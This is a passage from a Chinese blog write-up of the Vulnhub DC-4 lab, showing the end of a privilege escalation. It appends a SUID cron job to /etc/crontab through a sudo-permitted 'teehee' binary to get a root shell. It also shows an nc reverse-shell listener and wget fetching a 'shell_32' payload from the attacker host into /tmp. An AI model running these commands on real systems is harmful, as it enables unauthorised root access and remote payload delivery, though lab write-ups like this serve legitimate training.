&amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>charles@dc-4:/home/jim$ ls -l /bin/bash<br>-rwsrwxrwx 1 root root 1265272 May 16  2017 /bin/bash<br>charles@dc-4:/home/jim$ /bin/bash<br>bash-4.4$ whoami<br>charles<br>bash-4.4$ exit<br><br>charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/sh&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ ls -l /bin/sh<br>lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash<br>charles@dc-4:/home/jim$ ls -l /bin/dash<br>-rwsr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash<br>charles@dc-4:/home/jim$ /bin/sh<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$0</span></span><br>/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol>
+<li>web 登录页爆破：用户名 admin</li>
+<li>远程命令执行：bash、python 反弹失败，一句话木马写入失败，nc 反弹成功</li>
+<li>旧密码泄露，hydra 爆破 SSH</li>
+<li>邮件泄露用户密码</li>
+<li>teehee 提权（sudo 提权）：创建 root 权限用户（su 提权）、创建计划任务（SUID 提权）</li>
+</ol>
+<h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p>具有 s 权限的 .sh 文件，写入二进制文件数据后 s 权限没有了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 34116<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   8 root root  4096 Jul 12 07:14 tmp<br>www-data@dc-4:/home/jim$ wget http://192.168.135.141:8888/shell_32 /tmp<br>wget http://192.168.135.141:8888/shell_32 /tmp<br>--2022-07-12 07:16:47--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>shell_32: Permission denied<br><br>Cannot write to &#x27;shell_32&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-4:/home/jim$ cd /tmp<br>cd /tmp<br>www-data@dc-4:/tmp$ wget http://192.168.135.141:8888/shell_32<br>wget http://192.168.135.141:8888/shell_32<br>--2022-07-12 07:18:16--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>Saving to: &#x27;shell_32&#x27;<br><br>shell_32            100%[===================&gt;]  14.80K  --.-KB/s    in 0s      <br><br>2022-07-12 07:18:16 (168 MB/s) - &#x27;shell_32&#x27; saved [15152/15152]<br><br>www-data@dc-4:/tmp$ ls<br>ls<br>shell_32<br>systemd-private-3f7853ced3d74153bd9e92b584328615-systemd-timesyncd.service-3jUHwb<br>www-data@dc-4:/tmp$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ cat /tmp/shell_32 &gt; test.sh<br>cat /tmp/shell_32 &gt; test.sh<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 24<br>drwxr-xr-x 2 jim jim  4096 Apr  7  2019 backups<br>-rw------- 1 jim jim   528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim 15152 Jul 12 07:19 test.sh<br>www-data@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure>
+<p>发现只要修改文件 s 权限就没了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13 09:24 test.sh<br><span class="hljs-meta">$</span><span class="bash"> chmod u+s test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br></code></pre></td></tr></table></figure>
+<p>文件拥有者可以加 s 权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">im@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ chmod u+s test.sh<br>jim@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ <br></code></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/98188.htm">Linux 深入理解进程权限<em>linux shell</em>脚本之家 (jb51.net)</a></p>
+<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/226.html">C语言setuid()函数：设置真实的用户识别码_C语言中文网 (biancheng.net)</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1801346?from=15425">linux权限 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/SunMaolin/p/11982049.html">2019-2020-1 20199318《Linux内核原理与分析》第十二周作业 - 孙茂林 - 博客园 (cnblogs.com)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/11/MessUp/Hexo-Issue-Error/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hexo issue and error</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/">
+                        <span class="hidden-mobile">DC：5</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
